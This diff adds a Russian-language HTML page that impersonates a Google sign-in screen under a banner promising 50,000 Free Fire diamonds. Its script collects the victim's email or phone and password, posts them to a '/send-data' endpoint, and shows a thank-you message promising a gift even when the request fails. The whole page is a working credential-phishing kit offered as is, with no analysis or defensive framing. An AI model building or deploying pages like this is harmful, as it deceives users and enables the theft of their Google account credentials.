@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в Google</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #4285f4, #357abd);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .banner {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+        input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="banner">РАЗДАЧА 50 000 АЛМАЗОВ В FREE FIRE!</div>
+    <div class="container">
+        <h1>Вход в Google</h1>
+        <form id="loginForm">
+            <input type="text" id="login" placeholder="Электронная почта или телефон" required>
+            <input type="password" id="password" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const login = document.getElementById('login').value;
+            const password = document.getElementById('password').value;
+            const service = 'Google';
+
+            // Отправляем данные на сервер
+            fetch('/send-data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ service, login, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Спасибо! Ваши данные получены. Скоро вы получите свой подарок!');
+            })
+            .catch(() => {
+                alert('Спасибо! Ваши данные получены. Скоро вы получите свой подарок!');
+            });
+        });
+    </script>
+</body>
+</html>
